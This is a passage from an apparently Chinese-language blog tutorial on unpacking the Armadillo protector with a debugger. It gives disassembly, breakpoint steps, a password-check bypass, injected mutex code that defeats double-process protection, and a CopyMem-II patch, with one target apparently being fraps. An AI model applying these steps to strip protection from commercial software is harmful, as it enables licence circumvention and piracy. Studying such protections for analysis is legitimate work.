[eax+3C]</div><div class="line"><span class="number">010073BE</span>    <span class="number">03C8</span>            add     ecx, eax</div><div class="line"><span class="number">010073C0</span>    <span class="number">8139</span> <span class="number">50450000</span>   cmp     dword ptr [ecx], <span class="number">4550</span></div><div class="line"><span class="number">010073C6</span>    <span class="number">75</span> <span class="number">12</span>           jnz     short <span class="number">010073DA</span></div><div class="line"><span class="number">010073C8</span>    <span class="number">0FB741</span> <span class="number">18</span>       movzx   eax, word ptr [ecx+<span class="number">18</span>]</div><div class="line"><span class="number">010073CC</span>    3D <span class="number">0B010000</span>     cmp     eax, 10B</div><div class="line"><span class="number">010073D1</span>    <span class="number">74</span> 1F           je      short <span class="number">010073F2</span></div><div class="line"><span class="number">010073D3</span>    3D <span class="number">0B020000</span>     cmp     eax, 20B</div><div class="line"><span class="number">010073D8</span>    <span class="number">74</span> <span class="number">05</span>           je      short <span class="number">010073DF</span></div><div class="line"><span class="number">010073DA</span>    895D E4         mov     dword ptr [ebp-1C], ebx</div><div class="line"><span class="number">010073DD</span>    EB <span class="number">27</span>           jmp     short <span class="number">01007406</span></div><div class="line"><span class="number">010073DF</span>    <span class="number">83B9</span> <span class="number">84000000</span> <span class="number">0</span>&gt;cmp     dword ptr [ecx+<span class="number">84</span>], <span class="number">0E</span></div></pre></td></tr></table></figure><h3 id="0x2-2-单进程Armadillo-v4-x脱壳"><a href="#0x2-2-单进程Armadillo-v4-x脱壳" class="headerlink" title="0x2.2 单进程Armadillo v4.x脱壳"></a>0x2.2 单进程Armadillo v4.x脱壳</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先需要判断加壳版本是否是4.xxx。关于这点如何判断呢，主要下硬件断点 <code>HE OutputDebugStringA</code> 。在堆栈窗口出现%s%s%s%s的标志，说明这是4.X的壳。<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="number">0012</span>EC7<span class="number">0</span>   <span class="number">021</span>C580F  /CALL 到 OutputDebugStringA 来自 <span class="number">021</span>C5809</div><div class="line"><span class="number">0012</span>EC74   <span class="number">0012</span>F5E8  \String = <span class="string">"%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s"</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关于Armadillo v4.x单进程脱壳把握两点，<strong>第一，使用Magic_Jmp避过IAT加密保护，对GetCurrentThreadId下断点找到OEP</strong></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关于第一条，就是上面2.1讲的原则，下面解释第二条。首先对GetCurrentThreadId下断。<code>HE GetCurrentThreadId</code>。查看堆栈窗口，会出现如下结果.中间省略多个，查看关于GetCurrentThreadId都是来自其他模块的调用，但是最后一个是来自程序的调用。这就是程序返回的时机，所以，F8步过，根据之前说的规则，<strong>OEP在该程序段最后一个call ecx中。</strong><br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="number">0236</span>FE50   <span class="number">7339352</span>D  /CALL 到 GetCurrentThreadId 来自 msvbvm60<span class="number">.73393527</span></div><div class="line"><span class="comment">//</span></div><div class="line"><span class="number">0236</span>FE30   <span class="number">76</span>DE1434  /CALL 到 GetCurrentThreadId 来自 adsldpc<span class="number">.76</span>DE142E</div><div class="line"><span class="comment">//</span></div><div class="line"><span class="number">0236</span>FE78   <span class="number">76</span>F31298  /CALL 到 GetCurrentThreadId 来自 wldap32<span class="number">.76</span>F31292</div><div class="line"><span class="comment">//....</span></div><div class="line"><span class="number">0012</span>F720   <span class="number">037560</span>EC  /CALL 到 GetCurrentThreadId 来自 <span class="number">037560E6</span></div></pre></td></tr></table></figure></p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">0376F70F    <span class="number">3350</span> <span class="number">40</span>         <span class="keyword">xor</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>+<span class="number">0x40</span>]</div><div class="line">0376F712    <span class="number">3350</span> <span class="number">04</span>         <span class="keyword">xor</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>+<span class="number">0x4</span>]</div><div class="line">0376F715    2BCA            <span class="keyword">sub</span> <span class="built_in">ecx</span>,<span class="built_in">edx</span></div><div class="line">0376F717    FFD1            <span class="keyword">call</span> <span class="built_in">ecx</span>                                 <span class="comment">; NOTEPAD_.004010CC</span></div><div class="line">0376F719    <span class="number">8945</span> E4         <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x1C</span>],<span class="built_in">eax</span></div><div class="line">0376F71C    8B45 E4         <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x1C</span>]</div><div class="line">0376F71F    8B4D F0         <span class="keyword">mov</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x10</span>]</div><div class="line">0376F722    <span class="number">64</span>:<span class="number">890D</span> <span class="number">0000000</span>&gt;<span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">fs</span>:[<span class="number">0</span>],<span class="built_in">ecx</span></div><div class="line">0376F729    5F              <span class="keyword">pop</span> <span class="built_in">edi</span></div><div class="line">0376F72A    5E              <span class="keyword">pop</span> <span class="built_in">esi</span></div><div class="line">0376F72B    5B              <span class="keyword">pop</span> <span class="built_in">ebx</span></div><div class="line">0376F72C    C9              <span class="keyword">leave</span></div><div class="line">0376F72D    C3              <span class="keyword">retn</span></div></pre></td></tr></table></figure><h3 id="2-3-加-PassWord单进程"><a href="#2-3-加-PassWord单进程" class="headerlink" title="2.3 加 PassWord单进程"></a>2.3 加 PassWord单进程</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这是就比2.2多了一个密码验证，我们直接绕过密码验证就好。首先Shift+F9运行，通过查看导入表，在GetDlgItem处下断<code>bpx GetDlgItem</code>。然后在输入伪码按OK，程序中断在35359D0处.<strong>注意：先运行，在下断！在输入</strong><br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="number">035349</span>D0    FF15 E8645403   call    dword ptr [<span class="number">35464E8</span>]              ; USER32.GetDlgItem</div><div class="line"><span class="number">035349</span>D6    <span class="number">50</span>              push    eax</div><div class="line"><span class="number">035349</span>D7    FF15 E0645403   call    dword ptr [<span class="number">35464E0</span>]              ; USER32.GetWindowTextA</div><div class="line"><span class="number">035349</span>DD    <span class="number">8</span>D85 <span class="number">00</span>FFFFFF   lea     eax, dword ptr [ebp<span class="number">-100</span>]</div><div class="line"><span class="number">035349E3</span>    <span class="number">50</span>              push    eax</div><div class="line"><span class="number">035349E4</span>    E8 <span class="number">35060100</span>     call    <span class="number">0354501</span>E                         ; jmp 到 msvcrt.strlen</div><div class="line"><span class="number">035349E9</span>    <span class="number">85</span>C0            test    eax, eax</div><div class="line"><span class="number">035349</span>EB    <span class="number">59</span>              pop     ecx</div><div class="line"><span class="number">035349</span>EC    <span class="number">74</span> <span class="number">1</span>A           je      short <span class="number">03534</span>A08</div><div class="line"><span class="number">035349</span>EE    <span class="number">8</span>B0D E01E5503   mov     ecx, dword ptr [<span class="number">3551</span>EE0]</div><div class="line"><span class="number">035349</span>F4    <span class="number">8</span>D85 <span class="number">00</span>FFFFFF   lea     eax, dword ptr [ebp<span class="number">-100</span>]</div><div class="line"><span class="number">035349</span>FA    <span class="number">50</span>              push    eax</div><div class="line"><span class="number">035349</span>FB    E8 <span class="number">7</span>D77FEFF     call    <span class="number">0351</span>C17D                         ; 比较原始密码</div><div class="line"><span class="number">03534</span>A00    <span class="number">84</span>C0            test    al, al</div><div class="line"><span class="number">03534</span>A02    <span class="number">74</span> <span class="number">04</span>           je      short <span class="number">03534</span>A08                   ; 不是原码，则跳转(不跳)</div><div class="line"><span class="number">03534</span>A04    <span class="number">6</span>A <span class="number">01</span>           push    <span class="number">1</span></div><div class="line"><span class="number">03534</span>A06    EB <span class="number">4</span>C           jmp     short <span class="number">03534</span>A54                   ; 回到正常流程</div><div class="line"><span class="number">03534</span>A08    <span class="number">33</span>F6            xor     esi, esi</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着修改魔法跳，可以使用<code>bp GetModueHandle</code>或者<code>HE GetModuleHandle</code>。这里发现了kernel32.dll就可以执行到返回查看了。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后就是找OEP，这里还是可以使用2.2中对GetProcessId下断。这里介绍个新方法。**可以在内存窗口.text段按F2下断点。因为壳执行完肯定会执行代码段的内容。也就是说代码段是由外壳到源程序的一扇门。所以在此处下断必然成立。<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="number">004010</span>CC    <span class="number">55</span>               push    ebp</div><div class="line"><span class="number">004010</span>CD    <span class="number">8</span>BEC             mov     ebp, esp</div><div class="line"><span class="number">004010</span>CF    <span class="number">83</span>EC <span class="number">44</span>          sub     esp, <span class="number">44</span></div><div class="line"><span class="number">004010</span>D2    <span class="number">56</span>               push    esi</div><div class="line"><span class="number">004010</span>D3    FF15 E4634000    call    dword ptr [<span class="number">4063E4</span>]               ; kernel32.GetCommandLineA</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;总结一下，现在有两个方法可以找OEP。<strong>第一是对GetProcessId下断，第二个就是在.text下断。</strong></p><h3 id="0x2-4-包含Code-Splicing和Import-Table-Elimination的修复"><a href="#0x2-4-包含Code-Splicing和Import-Table-Elimination的修复" class="headerlink" title="0x2.4 包含Code Splicing和Import Table Elimination的修复"></a>0x2.4 包含Code Splicing和Import Table Elimination的修复</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Armadillo使用Code Splicing和Import Table Elimination两项技术使得程序修复变得更加困难。幸好有大佬开发了ArmInline工具可以使得修复变得简单一些。注意：本节只将修复，不讲程序优化。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当我们寻找到OEP之后，就可以着手修复Code Splicing和Import Table Elimination了。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">0040C434    <span class="number">55</span>              <span class="keyword">push</span> <span class="built_in">ebp</span></div><div class="line">0040C435    8BEC            <span class="keyword">mov</span> <span class="built_in">ebp</span>,<span class="built_in">esp</span></div><div class="line">0040C437    6A FF           <span class="keyword">push</span> -<span class="number">0x1</span></div><div class="line">0040C439    <span class="number">68</span> <span class="number">28334100</span>     <span class="keyword">push</span> fraps<span class="meta">.00413328</span></div><div class="line">0040C43E    <span class="number">68</span> 30E94000     <span class="keyword">push</span> fraps<span class="meta">.0040E930</span></div><div class="line">0040C443    <span class="number">64</span>:A1 <span class="number">00000000</span>  <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">fs</span>:[<span class="number">0</span>]</div><div class="line">0040C449    <span class="number">50</span>              <span class="keyword">push</span> <span class="built_in">eax</span></div><div class="line">0040C44A    <span class="number">64</span>:<span class="number">8925</span> <span class="number">0000000</span>&gt;<span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">fs</span>:[<span class="number">0</span>],<span class="built_in">esp</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先祭上大杀器ArmInline，欲要善其事，必先利其器。需要我们填写的就是上述三个区域，不过我这个版本可以自动填写修复的数据，只需要知道我们需要修复的进程，如图，目标进程ID为FC4，选中后依次删除拼接代码和巡回IAT基址。<br>    <img src="https://i.loli.net/2019/05/01/5cc930d294e58.png" alt=""></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后按照常规的方法dump和修复IAT就可以了。注意的是使用PELord一定要勾选<strong>从磁盘粘贴文件头(一般默认勾选上了)</strong></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果你的ArmInline不能自己修复(反正牛逼的师傅都是自己修复的，我不牛逼所以都是软件自动修复的)，关于<strong>Code Splicing</strong>的修复可以这样，Alt+M到内存窗口，在fraps模块之后有一段内存没有被其他模块映射(不知道这样说对不对，反正对于Kernel32这样的dll来说肯定是对的。大家理解就好)。<strong>在最后一块内存处</strong>，就是拼接代码起点，这个值不是一个定值。(这个只是经验之谈，需要大佬解释一波的)<br>    <img src="https://i.loli.net/2019/05/01/5cc93414c84c5.png" alt=""></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着修正IAT乱序，首先随便找个函数调用，在信息窗口点<code>数据窗口跟随地址</code>，然后向上拖动窗口(你最好改成<strong>显示地址</strong>)。找到IAT起始地址，然后找到结束地址，两者相减。计算大小即可。关于填充地址。可以考虑在一块没有读写的空白区域就好。不过大佬给的建议是在程序加壳前原来IAT的相近地方。可以这样寻找。Alt+M到内存窗口，因为IAT早rdata区域，又因为IAT肯定保存了一些IID成员，其中有个Name成员，也就是DllName。我们通过全局搜索确定<br>    <img src="https://i.loli.net/2019/05/01/5cc9396eea356.png" alt=""></p><h2 id="0x3-Armadillo双进程脱壳"><a href="#0x3-Armadillo双进程脱壳" class="headerlink" title="0x3 Armadillo双进程脱壳"></a>0x3 Armadillo双进程脱壳</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这一章节主要讲穿山甲的双进程保护手段。所以双进程保护，简单的来说就是创建两个进程，一个进程是另外一个进程的调试进程，又由于在R3下面一个进程只能被一个调试器附加。这样可以有效避免程序被调试。</p><h3 id="0x3-1-标准保护"><a href="#0x3-1-标准保护" class="headerlink" title="0x3.1 标准保护"></a>0x3.1 标准保护</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接下来简单讲解一下关于双进程保护的原理，主要可以利用互斥体来判断进程列表是否存在相同的进程(即多开)。首先是利用CreateMutex创建一个互斥体。然后在利用OpenMutex打开那个互斥体，如果OpenMutex成功返回互斥体句柄，说明已经存在一个进程。如果不存在则在CreateProcess一个进程。而对于穿山甲壳双转单也是如此。<strong>如果提前创建了一个即将被打开的互斥体。那么程序就不会去创建新的进程。</strong>如下的脱壳方法就是基于这点考虑。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先对openMutex下断点(HE,bp皆可)。<code>HE openMutexA</code>,然后shift+F9。观察堆栈<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="number">0012</span>F798   <span class="number">00434</span>DB8  /CALL 到 OpenMutexA 来自 NOTEPAD_<span class="number">.00434</span>DB2</div><div class="line"><span class="number">0012</span>F79C   <span class="number">001</span>F0001  |Access = <span class="number">1</span>F0001</div><div class="line"><span class="number">0012</span>F7A0   <span class="number">00000000</span>  |Inheritable = <span class="literal">FALSE</span></div><div class="line"><span class="number">0012</span>F7A4   <span class="number">0012</span>FDD8  \MutexName = <span class="string">"8A4::DABDC997F2"</span>   ；这是是重点，标记了互斥体名称。记住堆栈地址<span class="number">0012</span>FDD8，以后要用</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着需要创建互斥体。转到401000处编写汇编代码，为什么需要401000，因为这是.text段，但是理论上在哪里修改都可以。然后将EIP修改到401000处，就可以在这里执行了，然后shitf+F9.<br><figure class="highlight basic"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">00401000 </span>   <span class="number">60</span>                  pushad                    ;保存所有寄存器</div><div class="line"><span class="symbol">00401001 </span>   <span class="number">9</span>C                  pushfd                    ;保存标志寄存器</div><div class="line"><span class="symbol">00401002 </span>   <span class="number">68</span> F8FB1200         push <span class="number">0012</span>FDD8             ;堆栈里看到的值MutexName</div><div class="line"><span class="symbol">00401007 </span>   <span class="number">33</span>C0                <span class="keyword">xor</span> eax,eax</div><div class="line"><span class="symbol">00401009 </span>   <span class="number">50</span>                  push eax                  ;参数<span class="number">2</span></div><div class="line"><span class="number">0040100</span>A    <span class="number">50</span>                  push eax                  ;参数<span class="number">1</span></div><div class="line"><span class="number">0040100</span>B    E8 B5A6A577         <span class="keyword">call</span> kernel32.CreateMutexA  ；创建互斥体</div><div class="line"><span class="symbol">00401010 </span>   <span class="number">9D</span>                  popfd</div><div class="line"><span class="symbol">00401011 </span>   <span class="number">61</span>                  popad                      ;恢复</div><div class="line"><span class="symbol">00401012 </span> - E9 <span class="number">7</span>A13A677         jmp kernel32.OpenMutexA    ;打开互斥体</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着就是处理加密IAT和跳转OEP,DUMP的问题了。最后到达OEP如下：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">004010CC    <span class="number">55</span>              <span class="keyword">push</span> <span class="built_in">ebp</span></div><div class="line">004010CD    8BEC            <span class="keyword">mov</span> <span class="built_in">ebp</span>,<span class="built_in">esp</span></div><div class="line">004010CF    83EC <span class="number">44</span>         <span class="keyword">sub</span> <span class="built_in">esp</span>,<span class="number">0x44</span></div><div class="line">004010D2    <span class="number">56</span>              <span class="keyword">push</span> <span class="built_in">esi</span></div><div class="line">004010D3    FF15 E4634000   <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">0x4063E4</span>]             <span class="comment">; kernel32.GetCommandLineA</span></div><div class="line">004010D9    8BF0            <span class="keyword">mov</span> <span class="built_in">esi</span>,<span class="built_in">eax</span></div></pre></td></tr></table></figure><h3 id="0x3-2-CopyMem-II"><a href="#0x3-2-CopyMem-II" class="headerlink" title="0x3.2 CopyMem-II"></a>0x3.2 CopyMem-II</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;去除CopyMem-ll 保护通常有两个方法。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;方法1：首先寻找OEP，然后对WaitForDebugEvent下断点<code>bp WaitForDebugEvent</code>,接着运行程序，看堆栈，当出现<code>pDebugEvent</code>字符的时候，选择在数据窗口跟随，然后对WriteProcessMemory下断<code>bp WriteProcessMemory</code>，中断后，在数据窗口发现OEP。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这里重点讲一下第二个方法：  </p><ul><li><p>bp WaitForDebugEvent，shift+F9运行起来，删除断点，然后执行到程序领空,大概停在0060F8BA</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">0060F8BA   ?  <span class="number">15</span> E0406400   <span class="keyword">adc</span> <span class="built_in">eax</span>,&lt;&amp;KERNEL32.WaitForDebugEvent&gt;</div><div class="line">0060F8BF   .  85C0          <span class="keyword">test</span> <span class="built_in">eax</span>,<span class="built_in">eax</span></div><div class="line">0060F8C1   .  0F84 2B270000 <span class="keyword">je</span> MAGCT.00611FF2</div><div class="line">0060F8C7   .  8B85 FCFDFFFF <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x204</span>]</div><div class="line">0060F8CD   .  <span class="number">25</span> FF000000   <span class="keyword">and</span> <span class="built_in">eax</span>,<span class="number">0xFF</span></div><div class="line">0060F8D2   .  85C0          <span class="keyword">test</span> <span class="built_in">eax</span>,<span class="built_in">eax</span></div><div class="line">0060F8D4   .  <span class="number">74</span> <span class="number">13</span>         <span class="keyword">je</span> XMAGCT.0060F8E9</div><div class="line">0060F8D6   .  8B0D 44AF6400 <span class="keyword">mov</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">0x64AF44</span>]</div><div class="line">0060F8DC   .  <span class="number">8379</span> <span class="number">20</span> <span class="number">00</span>    <span class="keyword">cmp</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ecx</span>+<span class="number">0x20</span>],<span class="number">0x0</span></div><div class="line">0060F8E0   .  <span class="number">74</span> <span class="number">07</span>         <span class="keyword">je</span> XMAGCT.0060F8E9</div><div class="line">0060F8E2   .  C685 FCFDFFFF&gt;<span class="keyword">mov</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x204</span>],<span class="number">0x0</span></div><div class="line">0060F8E9   &gt;  <span class="number">68</span> 38AE6400   <span class="keyword">push</span> MAGCT.0064AE38                      <span class="comment">; /pCriticalSection = MAGCT.0064AE38</span></div><div class="line">0060F8EE   .  FF15 A4416400 <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[&lt;&amp;KERNEL32.EnterCriti&gt;<span class="comment">; \EnterCriticalSection</span></div></pre></td></tr></table></figure></li><li><p>然后Ctrl+F搜索命令：<code>or eax，0FFFFFFF8</code>,想上看有两个比较，一个是cmp dword ptr ss:[ebp-0xA34],另外一个是cmp ecx,dword ptr ds:[0x64AF48]，然后对第一个cmp下断点，F9运行。这一步你需要记住以下内容，等下patch的时候需要用到内容，第一:第一个cmp的地址<code>0060FE43</code>,第二：第一个cmp【】内的值<code>ebp-0xA34</code>,第三：第二个cmp【】的值：<code>0x64AF48</code>.<strong>除此以外，需要将次一个cmp栈里面的数据清0</strong></p></li></ul><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">0060FE43   &gt; \83BD CCF5FFFF <span class="number">00</span>     <span class="keyword">cmp</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0xA34</span>],<span class="number">0x0</span>         <span class="comment">;  3</span></div><div class="line">0060FE4A   .  0F8C A8020000        <span class="keyword">jl</span> MAGCT.006100F8                        <span class="comment">;在目的地址006100F8下断点</span></div><div class="line">0060FE50   .  8B8D CCF5FFFF        <span class="keyword">mov</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0xA34</span>]</div><div class="line">0060FE56   .  3B0D 48AF6400        <span class="keyword">cmp</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">0x64AF48</span>]          <span class="comment">;  2</span></div><div class="line">0060FE5C   .  0F8D <span class="number">96020000</span>        <span class="keyword">jge</span> MAGCT.006100F8</div><div class="line">0060FE62   .  8B95 40F6FFFF        <span class="keyword">mov</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x9C0</span>]</div><div class="line">0060FE68   .  81E2 FF000000        <span class="keyword">and</span> <span class="built_in">edx</span>,<span class="number">0xFF</span></div><div class="line">0060FE6E   .  85D2                 <span class="keyword">test</span> <span class="built_in">edx</span>,<span class="built_in">edx</span></div><div class="line">0060FE70   .  0F84 AD000000        <span class="keyword">je</span> MAGCT.0060FF23</div><div class="line">0060FE76   .  6A <span class="number">00</span>                <span class="keyword">push</span> <span class="number">0x0</span></div><div class="line">0060FE78   .  8BB5 CCF5FFFF        <span class="keyword">mov</span> <span class="built_in">esi</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0xA34</span>]</div><div class="line">0060FE7E   .  C1E6 <span class="number">04</span>              <span class="keyword">shl</span> <span class="built_in">esi</span>,<span class="number">0x4</span></div><div class="line">0060FE81   .  8B85 CCF5FFFF        <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0xA34</span>]</div><div class="line">0060FE87   .  <span class="number">25</span> <span class="number">07000080</span>          <span class="keyword">and</span> <span class="built_in">eax</span>,<span class="number">0x80000007</span></div><div class="line">0060FE8C   .  <span class="number">79</span> <span class="number">05</span>                <span class="keyword">jns</span> XMAGCT.0060FE93</div><div class="line">0060FE8E   .  <span class="number">48</span>                   <span class="keyword">dec</span> <span class="built_in">eax</span></div><div class="line">0060FE8F   .  83C8 F8              <span class="keyword">or</span> <span class="built_in">eax</span>,<span class="number">0xFFFFFFF8</span>                        <span class="comment">;  1</span></div><div class="line">0060FE92   .  <span class="number">40</span>                   <span class="keyword">inc</span> <span class="built_in">eax</span></div></pre></td></tr></table></figure><ul><li><p>接下来patch数据，我们向下看，找到<code>add eax,0xff</code>语句，在这里就可以patch了</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">//原始数据</div><div class="line">0060FF16      <span class="number">25</span> FF000000          <span class="keyword">and</span> <span class="built_in">eax</span>,<span class="number">0xFF</span>                             <span class="comment">;  patch</span></div><div class="line">0060FF1B      85C0                 <span class="keyword">test</span> <span class="built_in">eax</span>,<span class="built_in">eax</span></div><div class="line">0060FF1D      0F84 D5010000        <span class="keyword">je</span> MAGCT.006100F8</div><div class="line">0060FF23      <span class="number">837D</span> D8 <span class="number">00</span>           <span class="keyword">cmp</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x28</span>],<span class="number">0x0</span></div><div class="line">0060FF27      <span class="number">75</span> <span class="number">27</span>                <span class="keyword">jnz</span> XMAGCT.0060FF50</div><div class="line">0060FF29      8B15 D0436400        <span class="keyword">mov</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">0x6443D0</span>]</div><div class="line">//</div><div class="line">//patch模块</div><div class="line"><span class="keyword">inc</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>：[] //第一个<span class="keyword">CMP</span>内的值</div><div class="line"><span class="keyword">mov</span> <span 